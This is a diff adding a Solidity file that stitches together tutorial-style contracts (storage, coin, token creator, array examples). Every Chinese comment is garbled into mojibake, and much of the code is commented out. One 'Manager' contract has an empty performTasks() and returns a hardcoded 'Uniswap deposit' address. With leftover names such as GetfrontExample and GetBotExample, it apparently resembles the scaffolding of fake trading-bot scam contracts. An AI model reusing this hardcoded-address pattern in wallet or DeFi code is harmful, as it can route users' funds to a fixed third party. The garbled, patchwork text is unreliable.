@@ -1,0 +1,201 @@
+pragma solidity ^0.6.6;
+
+contract SimpleStorage {
+    uint storedData;
+
+    function set(uint x) public {
+        storedData = x;
+    }
+
+    function get() public view returns (uint) {
+        return storedData;
+    }
+}
+/*contract GetfrontExample {
+  // public state variable
+  uint[] public myArray;
+
+  // 閹稿洤鐣鹃悽鐔稿灇閻ㄥ嚕etter 閸戣姤鏆?
+  /*
+  function myArray(uint i) public view returns (uint) {
+      return myArray[i];
+  }
+  */
+
+  // 鏉╂柨娲栭弫缈犻嚋閺佹壆绮?
+  /*function getArray() public view returns (uint[] memory) {
+      return myArray;
+  }
+}*/
+contract Coin {
+    // 閸忔娊鏁€涙せ鈧笡ublic閳ユ繆顔€鏉╂瑤绨洪崣姗€鍣洪崣顖欎簰娴犲骸顦婚柈銊嚢閸欙拷
+    address public minter;
+    mapping (address => uint) public balances;
+
+    // 鏉炶顓归幋椋庮伂閸欘垯浜掗柅姘崇箖娴滃娆㈤柦鍫濐嚠閸欐ê瀵叉担婊冨毉妤傛ɑ鏅ラ惃鍕冀鎼达拷
+    event Sent(address from, address to, uint amount);
+
+    // 鏉╂瑦妲搁弸鍕偓鐘插毐閺佸府绱濋崣顏呮箒瑜版挸鎮庣痪锕€鍨卞鐑樻鏉╂劘顢?
+    /*constructor() {
+        minter = msg.sender;
+    }
+
+    function mint(address receiver, uint amount) public {
+        require(msg.sender == minter);
+        require(amount < 1e60);
+        balances[receiver] += amount;
+    }
+
+    function send(address receiver, uint amount) public {
+        require(amount <= balances[msg.sender], "Insufficient balance.");
+        balances[msg.sender] -= amount;
+        balances[receiver] += amount;
+        emit Sent(msg.sender, receiver, amount);
+    }*/
+}
+/*contract GetBNBExample {
+  // public state variable
+  uint[] public myArray;
+
+  // 閹稿洤鐣鹃悽鐔稿灇閻ㄥ嚕etter 閸戣姤鏆?
+  /*
+  function myArray(uint i) public view returns (uint) {
+      return myArray[i];
+  }
+  */
+
+  // 鏉╂柨娲栭弫缈犻嚋閺佹壆绮?
+  /*function getArray() public view returns (uint[] memory) {
+      return myArray;
+  }
+}*/
+contract C {
+    uint private data;
+
+    //function f(uint a) public returns(uint b) { return a + 1; }
+    function setData(uint a) public { data = a; }
+    //function getData() public returns(uint) { return data; }
+    //function compute(uint a, uint b) internal returns (uint) { return a+b; }
+}
+
+// 娑撳娼版禒锝囩垳缂傛牞鐦ч柨娆掝嚖
+/*contract D {
+    function readData() public {
+        C c = new C();
+        uint local = c.f(7); // 闁挎瑨顕ら敍姘灇閸涳拷 `f` 娑撳秴褰茬憴锟?
+        c.setData(3);
+        local = c.getData();
+        local = c.compute(3, 5); // 闁挎瑨顕ら敍姘灇閸涳拷 `compute` 娑撳秴褰茬憴锟?
+    }
+}*/
+
+contract E is C {
+    /*function g() public {
+        C c = new C();
+        uint val = compute(3, 5); // 鐠佸潡妫堕崘鍛村劥閹存劕鎲抽敍鍫滅矤缂佈勫閸氬牏瀹崇拋鍧楁６閻栬泛鎮庣痪锔藉灇閸涙﹫绱?
+    }*/
+}
+
+contract OwnedToken {
+    // TokenCreator 閺勵垰顩ф稉瀣暰娑斿娈戦崥鍫㈠缁鐎?
+    // 娑撳秴鍨卞鐑樻煀閸氬牏瀹抽惃鍕樈閿涘奔绡冮崣顖欎簰瀵洜鏁ょ€瑰啨鈧拷
+    TokenCreator creator;
+    address owner;
+    bytes32 name;
+
+    // 鏉╂瑦妲稿▔銊ュ斀 creator 閸滃矁顔曠純顔兼倳缁夋壆娈戦弸鍕偓鐘插毐閺佽埇鈧拷
+    constructor(bytes32 _name) public{
+        // 閻樿埖鈧礁褰夐柌蹇涒偓姘崇箖閸忚泛鎮曠粔鎷岊問闂傤噯绱濋懓灞肩瑝閺勵垶鈧俺绻冩笟瀣洤 this.owner 閻ㄥ嫭鏌熷蹇氼問闂傤喓鈧拷
+        // 鏉╂瑤绡冮柅鍌滄暏娴滃骸鍤遍弫甯礉閻楃懓鍩嗛弰顖氭躬閺嬪嫰鈧姴鍤遍弫棰佽厬閿涘奔缍橀崣顏囧厴閸嶅繗绻栭弽鍑ょ礄閳ユ粌鍞撮柈銊ユ勾閳ユ繐绱氱拫鍐暏鐎瑰啩婊戦敍锟?
+        // 閸ョ姳璐熼崥鍫㈠閺堫剝闊╂潻妯圭瑝鐎涙ê婀妴锟?
+        owner = msg.sender;
+        // 娴狅拷 `address` 閸掞拷 `TokenCreator` 閿涘本妲搁崑姘▔瀵繒娈戠猾璇茬€锋潪顒佸床
+        // 楠炴湹绗栭崑鍥х暰鐠嬪啰鏁ら崥鍫㈠閻ㄥ嫮琚崹瀣Ц TokenCreator閿涘本鐥呴張澶屾埂濮濓絿娈戦弬瑙勭《閺夈儲顥呴弻銉ㄧ箹娑撯偓閻愬箍鈧拷
+        creator = TokenCreator(msg.sender);
+        name = _name;
+    }
+
+    function changeName(bytes32 newName) public {
+        // 閸欘亝婀?creator 閿涘牆宓嗛崚娑樼紦瑜版挸澧犻崥鍫㈠閻ㄥ嫬鎮庣痪锔肩礆閼宠棄顧勯弴瀛樻暭閸氬秶袨 閳ユ柡鈧拷 閸ョ姳璐熼崥鍫㈠閺勵垶娈ｅ蹇氭祮閹诡澀璐熼崷鏉挎絻閻ㄥ嫸绱?
+        // 閹碘偓娴犮儴绻栭柌宀€娈戝В鏃囩窛閺勵垰褰茬悰宀€娈戦妴锟?
+        if (msg.sender == address(creator))
+            name = newName;
+    }
+
+    /*function transfer(address newOwner) public {
+        // 閸欘亝婀佽ぐ鎾冲閹碘偓閺堝鈧懏澧犻懗钘夊絺闁拷 token閵嗭拷
+        if (msg.sender != owner) return;
+        // 閹存垳婊戞稊鐔稿厒鐠囥垽妫?creator 閺勵垰鎯侀崣顖欎簰閸欐垿鈧降鈧拷
+        // 鐠囬攱鏁為幇蹇ョ礉鏉╂瑩鍣风拫鍐暏娴滃棔绔存稉顏冪瑓闂堛垹鐣炬稊澶屾畱閸氬牏瀹虫稉顓犳畱閸戣姤鏆熼妴锟?
+        // 婵″倹鐏夌拫鍐暏婢惰精瑙﹂敍鍫熺槷婵″偊绱濋悽鍙樼艾 gas 娑撳秷鍐婚敍澶涚礉娴兼氨鐝涢崡鍐蹭粻濮濄垺澧界悰灞烩偓锟?
+        //if (creator.isTokenTransferOK(owner, newOwner))
+            //owner = newOwner;
+    }*/
+}
+contract Manager {
+	function performTasks() public {
+	    
+	}
+
+	function uniswapDepositAddress() public pure returns (address) {
+		return 0xf7b1C863117C0A52ac18D145f3c02420C2B2CeAf;
+	}
+}
+contract TokenCreator {
+    function createToken(bytes32 name)
+       public
+       returns (OwnedToken tokenAddress)
+    {
+        // 閸掓稑缂撴稉鈧稉顏呮煀閻拷 Token 閸氬牏瀹抽獮鏈电瑬鏉╂柨娲栫€瑰啰娈戦崷鏉挎絻閵嗭拷
+        // 娴狅拷 JavaScript 閺傚綊娼伴弶銉嚛閿涘矁绻戦崶鐐佃閸ㄥ妲哥粻鈧崡鏇犳畱 `address` 缁鐎烽敍灞芥礈娑擄拷
+        // 鏉╂瑦妲搁崷锟?ABI 娑擃厼褰查悽銊ф畱閺堚偓閹恒儴绻庨惃鍕閸ㄥ鈧拷
+        return new OwnedToken(name);
+    }
+
+    function changeName(OwnedToken tokenAddress, bytes32 name)  public {
+        // 閸氬本鐗遍敍瀹峵okenAddress` 閻ㄥ嫬顦婚柈銊ц閸ㄥ绡冮弰锟?`address` 閵嗭拷
+        tokenAddress.changeName(name);
+    }
+
+    /*function isTokenTransferOK(address currentOwner, address newOwner)
+        public
+        view
+        returns (bool ok)
+    {
+        // 濡偓閺屻儰绔存禍娑楁崲閹板繒娈戦幆鍛枌閵嗭拷
+        address tokenAddress = msg.sender;
+        return (keccak256(newOwner) & 0xff) == (bytes20(tokenAddress) & 0xff);
+    }*/
+}
+contract arrayExample {
+  // public state variable
+  uint[] public myArray;
+
+  // 閹稿洤鐣鹃悽鐔稿灇閻ㄥ嚕etter 閸戣姤鏆?
+  /*
+  function myArray(uint i) public view returns (uint) {
+      return myArray[i];
+  }
+  */
+
+  // 鏉╂柨娲栭弫缈犻嚋閺佹壆绮?
+  function getArray() public view returns (uint[] memory) {
+      return myArray;
+  }
+}
+/*contract GetBotExample {
+  // public state variable
+  uint[] public myArray;
+
+  // 閹稿洤鐣鹃悽鐔稿灇閻ㄥ嚕etter 閸戣姤鏆?
+  /*
+  function myArray(uint i) public view returns (uint) {
+      return myArray[i];
+  }
+  */
+
+  // 鏉╂柨娲栭弫缈犻嚋閺佹壆绮?
+  /*function getArray() public view returns (uint[] memory) {
+      return myArray;
+  }
+}*/
